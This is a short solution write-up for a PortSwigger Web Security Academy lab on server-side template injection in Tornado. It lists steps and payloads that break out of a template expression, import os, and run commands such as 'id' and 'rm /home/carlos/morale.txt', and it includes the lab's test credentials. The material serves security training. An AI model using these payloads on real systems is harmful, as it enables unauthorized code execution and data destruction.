## Basic server-side template injection (code context)

**Category:** ssti
**Difficulty:** Medium

### Description
This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

### Solution Steps
1. Login with valid credentials (wiener:peter)
2. Find the "preferred name" functionality that controls blog post author display
3. Observe the POST /my-account/change-blog-post-author-display endpoint
4. The parameter blog-post-author-display accepts template expressions like user.name, user.first_name
5. Test for SSTI by injecting: `user.name}}{{7*7}}` - if you see "49" rendered, injection works
6. The application uses Tornado templates - research Tornado SSTI payloads
7. Break out of the current expression context and inject OS commands
8. Payload structure: `}}{% import os %}{{ os.popen("rm /home/carlos/morale.txt").read() }}{{`
9. Or use: `user.name}}{%import os%}{{os.system('rm /home/carlos/morale.txt')`
10. Submit the payload and verify the file is deleted

### Key Payloads
- `morale.txt`
- `wiener:peter`
- `POST /my-account/change-blog-post-author-display`
- `blog-post-author-display`
- `user.name`
- `{{7*7}}`
- `user.name}}{{7*7}}`
- `}}{%import os%}{{os.system('id')`
- `}}{%import os%}{{os.system('rm /home/carlos/morale.txt')`

### Indicators of Success
- Mathematical expressions evaluate (7*7 = 49)
- OS command output visible in response
- Target file successfully deleted
- No template syntax errors in response

---
*Source: PortSwigger Web Security Academy*
